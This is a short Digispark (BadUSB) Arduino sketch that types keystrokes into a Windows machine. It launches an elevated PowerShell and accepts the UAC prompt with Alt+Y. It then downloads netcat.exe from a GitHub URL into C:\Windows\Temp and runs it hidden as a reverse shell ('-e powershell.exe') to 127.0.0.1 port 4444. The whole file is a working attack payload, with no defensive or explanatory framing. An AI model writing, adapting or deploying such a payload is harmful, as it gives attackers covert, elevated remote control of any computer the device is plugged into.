#include <stdlib.h>
#include "DigiKeyboard.h"

void setup() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(100);
  DigiKeyboard.println("powershell Start-Process powershell -Verb runAs");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("Invoke-WebRequest https://github.com/tomiodarim/Digispark/blob/main/payloads/netcat.exe?raw=true -o C:\\Windows\\Temp\\nc.exe;");
  DigiKeyboard.sendKeyStroke(KEY_ENTER); 
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("Start-Process 'C:\\Windows\\Temp\\nc.exe' -ArgumentList '-e powershell.exe','127.0.0.1','4444' -WindowStyle Hidden");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

void loop() {}
